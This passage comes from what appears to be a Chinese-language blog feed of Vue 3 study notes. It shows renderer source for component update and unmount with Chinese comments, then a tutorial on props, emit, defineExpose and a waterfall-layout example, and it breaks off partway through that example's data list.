&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// activated hook for keep-alive roots.</span></span><br><span class="line">        <span class="comment">// #1742 activated hook must be accessed after first render</span></span><br><span class="line">        <span class="comment">// since the hook may be injected by a child keep-alive</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">          initialVNode.<span class="property">shapeFlag</span> &amp; <span class="title class_">ShapeFlags</span>.<span class="property">COMPONENT_SHOULD_KEEP_ALIVE</span> ||</span><br><span class="line">          (parent &amp;&amp;</span><br><span class="line">            <span class="title function_">isAsyncWrapper</span>(parent.<span class="property">vnode</span>) &amp;&amp;</span><br><span class="line">            parent.<span class="property">vnode</span>.<span class="property">shapeFlag</span> &amp; <span class="title class_">ShapeFlags</span>.<span class="property">COMPONENT_SHOULD_KEEP_ALIVE</span>)</span><br><span class="line">        ) &#123;</span><br><span class="line">          instance.<span class="property">a</span> &amp;&amp; <span class="title function_">queuePostRenderEffect</span>(instance.<span class="property">a</span>, parentSuspense)</span><br><span class="line">          <span class="keyword">if</span> (</span><br><span class="line">            __COMPAT__ &amp;&amp;</span><br><span class="line">            <span class="title function_">isCompatEnabled</span>(<span class="title class_">DeprecationTypes</span>.<span class="property">INSTANCE_EVENT_HOOKS</span>, instance)</span><br><span class="line">          ) &#123;</span><br><span class="line">            <span class="title function_">queuePostRenderEffect</span>(</span><br><span class="line">              <span class="function">() =&gt;</span> instance.<span class="title function_">emit</span>(<span class="string">&#x27;hook:activated&#x27;</span>),</span><br><span class="line">              parentSuspense</span><br><span class="line">            )</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        instance.<span class="property">isMounted</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__DEV__ || __FEATURE_PROD_DEVTOOLS__) &#123;</span><br><span class="line">          <span class="title function_">devtoolsComponentAdded</span>(instance)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// #2458: deference mount-only object parameters to prevent memleaks</span></span><br><span class="line">        initialVNode = container = anchor = <span class="literal">null</span> <span class="keyword">as</span> <span class="built_in">any</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// updateComponent</span></span><br><span class="line">        <span class="comment">// This is triggered by mutation of component&#x27;s own state (next: null)</span></span><br><span class="line">        <span class="comment">// OR parent calling processComponent (next: VNode)</span></span><br><span class="line">        <span class="keyword">let</span> &#123; next, bu, u, parent, vnode &#125; = instance</span><br><span class="line">        <span class="keyword">let</span> originNext = next</span><br><span class="line">        <span class="keyword">let</span> <span class="attr">vnodeHook</span>: <span class="title class_">VNodeHook</span> | <span class="literal">null</span> | <span class="literal">undefined</span></span><br><span class="line">        <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">pushWarningContext</span>(next || instance.<span class="property">vnode</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Disallow component effect recursion during pre-lifecycle hooks.</span></span><br><span class="line">        <span class="title function_">toggleRecurse</span>(instance, <span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">if</span> (next) &#123;</span><br><span class="line">          next.<span class="property">el</span> = vnode.<span class="property">el</span></span><br><span class="line">          <span class="title function_">updateComponentPreRender</span>(instance, next, optimized)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          next = vnode</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// beforeUpdate hook</span></span><br><span class="line">        <span class="comment">// 执行beforeUpdate钩子</span></span><br><span class="line">        <span class="keyword">if</span> (bu) &#123;</span><br><span class="line">          <span class="title function_">invokeArrayFns</span>(bu)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// onVnodeBeforeUpdate</span></span><br><span class="line">        <span class="keyword">if</span> ((vnodeHook = next.<span class="property">props</span> &amp;&amp; next.<span class="property">props</span>.<span class="property">onVnodeBeforeUpdate</span>)) &#123;</span><br><span class="line">          <span class="title function_">invokeVNodeHook</span>(vnodeHook, parent, next, vnode)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">          __COMPAT__ &amp;&amp;</span><br><span class="line">          <span class="title function_">isCompatEnabled</span>(<span class="title class_">DeprecationTypes</span>.<span class="property">INSTANCE_EVENT_HOOKS</span>, instance)</span><br><span class="line">        ) &#123;</span><br><span class="line">          instance.<span class="title function_">emit</span>(<span class="string">&#x27;hook:beforeUpdate&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">toggleRecurse</span>(instance, <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// render</span></span><br><span class="line">        <span class="comment">// 执行beforeUpdate钩子后也要进行渲染</span></span><br><span class="line">        <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">startMeasure</span>(instance, <span class="string">`render`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> nextTree = <span class="title function_">renderComponentRoot</span>(instance)</span><br><span class="line">        <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">endMeasure</span>(instance, <span class="string">`render`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> prevTree = instance.<span class="property">subTree</span></span><br><span class="line">        instance.<span class="property">subTree</span> = nextTree</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">startMeasure</span>(instance, <span class="string">`patch`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">patch</span>(</span><br><span class="line">          prevTree,</span><br><span class="line">          nextTree,</span><br><span class="line">          <span class="comment">// parent may have changed if it&#x27;s in a teleport</span></span><br><span class="line">          <span class="title function_">hostParentNode</span>(prevTree.<span class="property">el</span>!)!,</span><br><span class="line">          <span class="comment">// anchor may have changed if it&#x27;s in a fragment</span></span><br><span class="line">          <span class="title function_">getNextHostNode</span>(prevTree),</span><br><span class="line">          instance,</span><br><span class="line">          parentSuspense,</span><br><span class="line">          isSVG</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">endMeasure</span>(instance, <span class="string">`patch`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        next.<span class="property">el</span> = nextTree.<span class="property">el</span></span><br><span class="line">        <span class="keyword">if</span> (originNext === <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="comment">// self-triggered update. In case of HOC, update parent component</span></span><br><span class="line">          <span class="comment">// vnode el. HOC is indicated by parent instance&#x27;s subTree pointing</span></span><br><span class="line">          <span class="comment">// to child component&#x27;s vnode</span></span><br><span class="line">          <span class="title function_">updateHOCHostEl</span>(instance, nextTree.<span class="property">el</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// updated hook</span></span><br><span class="line">        <span class="comment">// 执行updated钩子</span></span><br><span class="line">        <span class="keyword">if</span> (u) &#123;</span><br><span class="line">          <span class="title function_">queuePostRenderEffect</span>(u, parentSuspense)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// onVnodeUpdated</span></span><br><span class="line">        <span class="comment">// 组件更新后执行，此时DOM已经更新</span></span><br><span class="line">        <span class="keyword">if</span> ((vnodeHook = next.<span class="property">props</span> &amp;&amp; next.<span class="property">props</span>.<span class="property">onVnodeUpdated</span>)) &#123;</span><br><span class="line">          <span class="title function_">queuePostRenderEffect</span>(</span><br><span class="line">            <span class="function">() =&gt;</span> <span class="title function_">invokeVNodeHook</span>(vnodeHook!, parent, next!, vnode),</span><br><span class="line">            parentSuspense</span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">          __COMPAT__ &amp;&amp;</span><br><span class="line">          <span class="title function_">isCompatEnabled</span>(<span class="title class_">DeprecationTypes</span>.<span class="property">INSTANCE_EVENT_HOOKS</span>, instance)</span><br><span class="line">        ) &#123;</span><br><span class="line">          <span class="title function_">queuePostRenderEffect</span>(</span><br><span class="line">            <span class="function">() =&gt;</span> instance.<span class="title function_">emit</span>(<span class="string">&#x27;hook:updated&#x27;</span>),</span><br><span class="line">            parentSuspense</span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__DEV__ || __FEATURE_PROD_DEVTOOLS__) &#123;</span><br><span class="line">          <span class="title function_">devtoolsComponentUpdated</span>(instance)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">popWarningContext</span>()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create reactive effect for rendering</span></span><br><span class="line">    <span class="keyword">const</span> effect = (instance.<span class="property">effect</span> = <span class="keyword">new</span> <span class="title class_">ReactiveEffect</span>(</span><br><span class="line">      componentUpdateFn,</span><br><span class="line">      <span class="function">() =&gt;</span> <span class="title function_">queueJob</span>(update),</span><br><span class="line">      instance.<span class="property">scope</span> <span class="comment">// track it in component&#x27;s effect scope</span></span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">update</span>: <span class="title class_">SchedulerJob</span> = (instance.<span class="property">update</span> = <span class="function">() =&gt;</span> effect.<span class="title function_">run</span>())</span><br><span class="line">    update.<span class="property">id</span> = instance.<span class="property">uid</span></span><br><span class="line">    <span class="comment">// allowRecurse</span></span><br><span class="line">    <span class="comment">// #1801, #2043 component render effects should allow recursive updates</span></span><br><span class="line">    <span class="title function_">toggleRecurse</span>(instance, <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">      effect.<span class="property">onTrack</span> = instance.<span class="property">rtc</span></span><br><span class="line">        ? <span class="function"><span class="params">e</span> =&gt;</span> <span class="title function_">invokeArrayFns</span>(instance.<span class="property">rtc</span>!, e)</span><br><span class="line">        : <span class="built_in">void</span> <span class="number">0</span></span><br><span class="line">      effect.<span class="property">onTrigger</span> = instance.<span class="property">rtg</span></span><br><span class="line">        ? <span class="function"><span class="params">e</span> =&gt;</span> <span class="title function_">invokeArrayFns</span>(instance.<span class="property">rtg</span>!, e)</span><br><span class="line">        : <span class="built_in">void</span> <span class="number">0</span></span><br><span class="line">      update.<span class="property">ownerInstance</span> = instance</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">update</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">unmount</span>: <span class="title class_">UnmountFn</span> = <span class="function">(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">    vnode,</span></span></span><br><span class="line"><span class="params"><span class="function">    parentComponent,</span></span></span><br><span class="line"><span class="params"><span class="function">    parentSuspense,</span></span></span><br><span class="line"><span class="params"><span class="function">    doRemove = <span class="literal">false</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    optimized = <span class="literal">false</span></span></span></span><br><span class="line"><span class="params"><span class="function">  </span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;</span><br><span class="line">      <span class="keyword">type</span>,</span><br><span class="line">      props,</span><br><span class="line">      ref,</span><br><span class="line">      children,</span><br><span class="line">      dynamicChildren,</span><br><span class="line">      shapeFlag,</span><br><span class="line">      patchFlag,</span><br><span class="line">      dirs</span><br><span class="line">    &#125; = vnode</span><br><span class="line">    <span class="comment">// unset ref</span></span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="title function_">setRef</span>(ref, <span class="literal">null</span>, parentSuspense, vnode, <span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (shapeFlag &amp; <span class="title class_">ShapeFlags</span>.<span class="property">COMPONENT_SHOULD_KEEP_ALIVE</span>) &#123;</span><br><span class="line">      ;(parentComponent!.<span class="property">ctx</span> <span class="keyword">as</span> <span class="title class_">KeepAliveContext</span>).<span class="title function_">deactivate</span>(vnode)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> shouldInvokeDirs = shapeFlag &amp; <span class="title class_">ShapeFlags</span>.<span class="property">ELEMENT</span> &amp;&amp; dirs</span><br><span class="line">    <span class="keyword">const</span> shouldInvokeVnodeHook = !<span class="title function_">isAsyncWrapper</span>(vnode)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="attr">vnodeHook</span>: <span class="title class_">VNodeHook</span> | <span class="literal">undefined</span> | <span class="literal">null</span></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      shouldInvokeVnodeHook &amp;&amp;</span><br><span class="line">      (vnodeHook = props &amp;&amp; props.<span class="property">onVnodeBeforeUnmount</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="title function_">invokeVNodeHook</span>(vnodeHook, parentComponent, vnode)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (shapeFlag &amp; <span class="title class_">ShapeFlags</span>.<span class="property">COMPONENT</span>) &#123;</span><br><span class="line">      <span class="comment">// 清除组件引用的effect副作用函数</span></span><br><span class="line">      <span class="title function_">unmountComponent</span>(vnode.<span class="property">component</span>!, parentSuspense, doRemove)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (__FEATURE_SUSPENSE__ &amp;&amp; shapeFlag &amp; <span class="title class_">ShapeFlags</span>.<span class="property">SUSPENSE</span>) &#123;</span><br><span class="line">        vnode.<span class="property">suspense</span>!.<span class="title function_">unmount</span>(parentSuspense, doRemove)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 执行beforeUnmount钩子</span></span><br><span class="line">      <span class="keyword">if</span> (shouldInvokeDirs) &#123;</span><br><span class="line">        <span class="title function_">invokeDirectiveHook</span>(vnode, <span class="literal">null</span>, parentComponent, <span class="string">&#x27;beforeUnmount&#x27;</span>)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (shapeFlag &amp; <span class="title class_">ShapeFlags</span>.<span class="property">TELEPORT</span>) &#123;</span><br><span class="line">        ;(vnode.<span class="property">type</span> <span class="keyword">as</span> <span class="keyword">typeof</span> <span class="title class_">TeleportImpl</span>).<span class="title function_">remove</span>(</span><br><span class="line">          vnode,</span><br><span class="line">          parentComponent,</span><br><span class="line">          parentSuspense,</span><br><span class="line">          optimized,</span><br><span class="line">          internals,</span><br><span class="line">          doRemove</span><br><span class="line">        )</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (</span><br><span class="line">        dynamicChildren &amp;&amp;</span><br><span class="line">        <span class="comment">// #1153: fast path should not be taken for non-stable (v-for) fragments</span></span><br><span class="line">        (<span class="keyword">type</span> !== <span class="title class_">Fragment</span> ||</span><br><span class="line">          (patchFlag &gt; <span class="number">0</span> &amp;&amp; patchFlag &amp; <span class="title class_">PatchFlags</span>.<span class="property">STABLE_FRAGMENT</span>))</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="comment">// fast path for block nodes: only need to unmount dynamic children.</span></span><br><span class="line">        <span class="comment">// 组件卸载完成后，清空当前组件下所有的子节点</span></span><br><span class="line">        <span class="title function_">unmountChildren</span>(</span><br><span class="line">          dynamicChildren,</span><br><span class="line">          parentComponent,</span><br><span class="line">          parentSuspense,</span><br><span class="line">          <span class="literal">false</span>,</span><br><span class="line">          <span class="literal">true</span></span><br><span class="line">        )</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (</span><br><span class="line">        (<span class="keyword">type</span> === <span class="title class_">Fragment</span> &amp;&amp;</span><br><span class="line">          patchFlag &amp;</span><br><span class="line">            (<span class="title class_">PatchFlags</span>.<span class="property">KEYED_FRAGMENT</span> | <span class="title class_">PatchFlags</span>.<span class="property">UNKEYED_FRAGMENT</span>)) ||</span><br><span class="line">        (!optimized &amp;&amp; shapeFlag &amp; <span class="title class_">ShapeFlags</span>.<span class="property">ARRAY_CHILDREN</span>)</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="title function_">unmountChildren</span>(children <span class="keyword">as</span> <span class="title class_">VNode</span>[], parentComponent, parentSuspense)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (doRemove) &#123;</span><br><span class="line">        <span class="title function_">remove</span>(vnode)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 卸载完成，执行unmounted钩子</span></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      (shouldInvokeVnodeHook &amp;&amp;</span><br><span class="line">        (vnodeHook = props &amp;&amp; props.<span class="property">onVnodeUnmounted</span>)) ||</span><br><span class="line">      shouldInvokeDirs</span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="title function_">queuePostRenderEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        vnodeHook &amp;&amp; <span class="title function_">invokeVNodeHook</span>(vnodeHook, parentComponent, vnode)</span><br><span class="line">        shouldInvokeDirs &amp;&amp;</span><br><span class="line">          <span class="title function_">invokeDirectiveHook</span>(vnode, <span class="literal">null</span>, parentComponent, <span class="string">&#x27;unmounted&#x27;</span>)</span><br><span class="line">      &#125;, parentSuspense)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>父子组件传参</title>
    <url>/web/study/Vue/14.%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%8F%82.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="props"><a href="#props" class="headerlink" title="props"></a>props</h1><p>父组件传给子组件的值。</p>
<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;我是父级&lt;/div&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;waterFall :title=&quot;name&quot; :arr=&quot;[1,2,3]&quot;&gt;&lt;/waterFall&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import waterFall from &quot;./components/WaterFall.vue&quot;</span><br><span class="line"></span><br><span class="line">// 传给子组件的值</span><br><span class="line">const name = &quot;yajue&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>WaterFall.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    我是子级</span><br><span class="line">    &lt;!-- 定义的父传子传值可以直接在模板里使用 --&gt;</span><br><span class="line">    &lt;div&gt;title：&#123;&#123; title &#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;div&gt;arr&#123;&#123; arr &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">// 接收父组件传的值</span><br><span class="line"></span><br><span class="line">// 没有使用ts的情况</span><br><span class="line">// const props = defineProps(&#123;</span><br><span class="line">//   // 接收一个title数据</span><br><span class="line">//   title: &#123;</span><br><span class="line">//     // 规定该数据的类型为字符串</span><br><span class="line">//     type: String,</span><br><span class="line">//     // 默认值，如果父组件没有传就是这个值</span><br><span class="line">//     default: &quot;默认值&quot;</span><br><span class="line">//   &#125;,</span><br><span class="line">//   arr: &#123;</span><br><span class="line">//     default: []</span><br><span class="line">//   &#125;</span><br><span class="line">// &#125;)</span><br><span class="line"></span><br><span class="line">// 使用了ts的情况</span><br><span class="line">// withDefaults是使用ts特有的函数，用于定义默认值</span><br><span class="line">const props = withDefaults(defineProps&lt;&#123;</span><br><span class="line">  title: string</span><br><span class="line">  arr: number[]</span><br><span class="line">&#125;&gt;(), &#123;</span><br><span class="line">  title: &quot;默认值&quot;,</span><br><span class="line">  // 如果是引用数据类型定义默认值，需要用一个匿名函数作返回</span><br><span class="line">  arr: ()=&gt; [114514]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 但是不能在代码里直接使用</span><br><span class="line">// console.log(title)</span><br><span class="line">// 需要通过defineProps的返回值获取</span><br><span class="line">console.log(props.title, props.arr)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="emit"><a href="#emit" class="headerlink" title="emit"></a>emit</h1><p>子组件的自定义事件，可以用来传值。</p>
<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;我是父级&lt;/div&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;waterFall @on-click=&quot;getArgs&quot;&gt;&lt;/waterFall&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import waterFall from &quot;./components/WaterFall.vue&quot;</span><br><span class="line"></span><br><span class="line">// 触发子组件自定义事件时的回调（能拿到子组件传的值）</span><br><span class="line">const getArgs = (...args: any[])=&gt; &#123;</span><br><span class="line">  console.log(args)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>WaterFall.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    我是子级</span><br><span class="line">    &lt;button @click=&quot;send&quot;&gt;给父组件传值&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">// 给父组件传值（定义自定义事件）</span><br><span class="line"></span><br><span class="line">// 没有使用ts的情况</span><br><span class="line">// const emit = defineEmits([&quot;on-click&quot;])</span><br><span class="line"></span><br><span class="line">// 使用了ts的情况</span><br><span class="line">const emit = defineEmits&lt;&#123;</span><br><span class="line">  (e: &quot;on-click&quot;, title: string, ...rest: number[]): void</span><br><span class="line">&#125;&gt;()</span><br><span class="line"></span><br><span class="line">const send = ()=&gt; &#123;</span><br><span class="line">  // 触发自定义事件，可以顺便传值</span><br><span class="line">  emit(&quot;on-click&quot;, &quot;子组件传的值&quot;, 114514, 1919810)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="expose"><a href="#expose" class="headerlink" title="expose"></a>expose</h1><p>给父组件暴露属性和方法。</p>
<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;我是父级&lt;/div&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;waterFall ref=&quot;wf&quot;&gt;&lt;/waterFall&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">// 用ts读取wf的类型</span><br><span class="line">const wf = ref&lt;InstanceType&lt;typeof waterFall&gt;&gt;()</span><br><span class="line"></span><br><span class="line">onMounted(()=&gt; &#123;</span><br><span class="line">  console.log(&quot;~~~onMounted~~~&quot;)</span><br><span class="line">  console.log(wf.value?.name)</span><br><span class="line">  wf.value?.open()</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>WaterFall.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    我是子级</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">// 给父组件暴露属性和方法</span><br><span class="line">defineExpose(&#123;</span><br><span class="line">  name: &quot;yjsp&quot;,</span><br><span class="line">  open: ()=&gt; console.log(&quot;I am open function&quot;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="图片流布局实例"><a href="#图片流布局实例" class="headerlink" title="图片流布局实例"></a>图片流布局实例</h1><p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;我是父级&lt;/div&gt;</span><br><span class="line">  &lt;waterFall ref=&quot;wf&quot; :list=&quot;list&quot;&gt;&lt;/waterFall&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import waterFall from &quot;./components/WaterFall.vue&quot;</span><br><span class="line"></span><br><span class="line">const list = [</span><br><span class="line">  &#123;</span><br><span class="line">    height: 300,</span><br><span class="line">    background: &#x27;red&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 400,</span><br><span class="line">    background: &#x27;pink&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 500,</span><br><span class="line">    background: &#x27;blue&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 200,</span><br><span class="line">    background: &#x27;green&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 300,</span><br><span class="line">    background: &#x27;gray&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 400,</span><br><span class="line">    background: &#x27;#CC00FF&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 200,</span><br><span class="line">    background: &#x27;black&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 100,</span><br><span class="line">    background: &#x27;#996666&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 500,</span><br><span class="line">    background: &#x27;skyblue&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 300,</span><br><span class="line">    background: &#x27;#993366&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 100,</span><br><span class="line">    background: &#x27;#33FF33&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 400,</span><br><span class="line">    background: &#x27;skyblue&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 200,</span><br><span class="line">    background: &#x27;#6633CC&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 300,</span><br><span class="line">    background: &#x27;#666699&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 300,</span><br><span class="line">    background: &#x27;#66CCFF&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 300,</span><br><span class="line">    background: &#x27;skyblue&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 200,</span><br><span class="line">    background: &#x27;#CC3366&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 200,</span><br><span class="line">    background: &#x27;#CC9966&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 200,</span><br><span class="line">    background: &#x27;#FF00FF&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 500,</span><br><span class="line">    background: &#x27;#990000&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 400,</span><br><span class="line">    background: &#x27;red&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 100,</span><br><span class="line">    background: &#x27;#999966&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 200,</span><br><span class="line">    background: &#x27;#CCCC66&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 300,</span><br><span class="line">    background: &#x27;#FF33FF&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 400,</span><br><span class="line">    background: &#x27;#FFFF66&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 200,</span><br><span class="line">    background: &#x27;red&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 100,</span><br><span class="line">    background: &#x27;skyblue&#x27;</span><br><span 